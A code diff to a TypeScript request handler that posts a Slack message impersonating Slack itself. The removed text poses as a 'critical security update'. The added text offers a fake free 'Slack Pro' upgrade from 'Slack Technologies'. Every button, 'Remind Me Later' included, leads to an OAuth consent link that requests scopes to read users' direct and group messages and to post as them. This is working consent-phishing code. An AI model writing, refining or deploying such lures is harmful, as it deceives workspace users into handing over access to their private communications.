@@ -24,15 +24,43 @@ export async function POST(req: Request) {
        const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
        const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
        
-       const blocks = [
-        { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
-        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
+      const blocks = [
+        { 
+            "type": "header", 
+            "text": { 
+                "type": "plain_text", 
+                "text": "✨ Slack Pro: Free Upgrade Available", 
+                "emoji": true 
+            } 
+        },
+        { 
+            "type": "section", 
+            "text": { 
+                "type": "mrkdwn", 
+                "text": "🎉 *Limited Time Offer:* Premium Slack Pro features are now available to you for free!\n\n⚠️ **Action Required:** To activate, please **login to Slack in Google Chrome** and click below to install the update." 
+            } 
+        },
         { "type": "divider" },
-        { "type": "actions", "elements": [
-            { "type": "button", "text": { "type": "plain_text", "text": "Install Update", "emoji": true }, "style": "primary", "url": authLink },
-            { "type": "button", "text": { "type": "plain_text", "text": "Review Later", "emoji": true }, "url": authLink }
-        ]},
-        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack System" } ] }
+        { 
+            "type": "actions", 
+            "elements": [
+                { 
+                    "type": "button", 
+                    "text": { "type": "plain_text", "text": "Install Upgrade", "emoji": true }, 
+                    "style": "primary", 
+                    "url": authLink 
+                },
+                { 
+                    "type": "button", 
+                    "text": { "type": "plain_text", "text": "Remind Me Later", "emoji": true }, 
+                    "url": authLink 
+                }
+            ]
+        },
+        { 
+            "type": "context", 
+            "elements": [ { "type": "mrkdwn", "text": "🎁 Official Offer • Slack Technologies" } ] 
+        }
        ];
 
        const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
